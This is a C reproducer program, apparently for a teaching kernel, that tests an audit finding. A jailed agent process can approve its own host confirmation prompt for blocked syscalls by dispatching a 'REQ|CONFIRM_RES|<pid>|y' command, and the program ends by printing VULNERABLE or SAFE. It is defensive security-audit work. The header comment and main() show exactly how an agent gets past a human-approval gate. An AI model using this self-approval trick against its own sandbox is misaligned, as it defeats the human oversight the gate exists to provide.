// secconfirm.c — red-team reproducer for SECURITY_AUDIT finding #1.
//
// Finding: a blocked syscall (exec/kill/mknod) from a jailed agent is supposed
// to require a HOST y/N via confirm-escape. But sys_dispatch() (kernel/sysproc.c)
// has no is_agent guard, and agent_dispatch_now() routes CONFIRM_RES (agentcmd.c)
// before the deny-list. So a jailed process can answer its OWN confirm prompt:
//   dispatch("REQ|CONFIRM_RES|<pid>|y")  ->  confirm_resolve(pid, ALLOW)
//
// This program does NOT modify kernel code. The parent jails itself, forks a
// child (is_agent is inherited) that trips the mknod gate, then the parent
// self-approves the child's pending confirm purely from inside the sandbox —
// no host involved.
//   child mknod rc == 0  -> RESULT=VULNERABLE (self-approval worked)
//   child mknod rc == -1 -> RESULT=SAFE        (host approval required)
//
// Driven head-less by tools/sec_audit.py; also runnable by hand: `secconfirm`.
#include "kernel/types.h"
#include "kernel/stat.h"
#include "user/user.h"

static void
spin(long n)
{
  volatile long i;
  for(i = 0; i < n; i++)
    ;
}

// append decimal n into buf at pos, return new pos
static int
put_int(char *buf, int pos, int n)
{
  char tmp[12];
  int t = 0;
  if(n == 0)
    tmp[t++] = '0';
  while(n > 0){ tmp[t++] = '0' + (n % 10); n /= 10; }
  while(t > 0)
    buf[pos++] = tmp[--t];
  return pos;
}

int
main(void)
{
  mkdir("/agentbox");
  if(jail("/agentbox") < 0){
    printf("SECCONFIRM: jail() failed\n");
    exit(1);
  }

  int child = fork();
  if(child < 0){
    printf("SECCONFIRM: fork failed\n");
    exit(1);
  }
  if(child == 0){
    // Victim: trip the mknod confirm-escape gate. With no host listening, this
    // only returns 0 if someone APPROVED it — here, our own parent via dispatch.
    int rc = mknod("scnode", 1, 1);
    if(rc == 0)
      printf("SECCONFIRM: RESULT=VULNERABLE child mknod APPROVED via self-dispatch (rc=0)\n");
    else
      printf("SECCONFIRM: RESULT=SAFE child mknod denied (rc=%d)\n", rc);
    exit(0);
  }

  // Attacker (parent, also is_agent): build "REQ|CONFIRM_RES|<child>|y" and
  // dispatch it repeatedly so one lands once the child has registered its
  // pending confirm. confirm_resolve() is idempotent, so retries are harmless.
  char line[48];
  int p = 0;
  const char *pre = "REQ|CONFIRM_RES|";
  for(int i = 0; pre[i]; i++)
    line[p++] = pre[i];
  p = put_int(line, p, child);
  line[p++] = '|';
  line[p++] = 'y';
  line[p]   = 0;

  for(int attempt = 0; attempt < 40; attempt++){
    spin(1000000);
    dispatch(line);          // self-approve — the missing is_agent guard
  }

  wait(0);                   // reap the child after it prints its verdict
  exit(0);
}
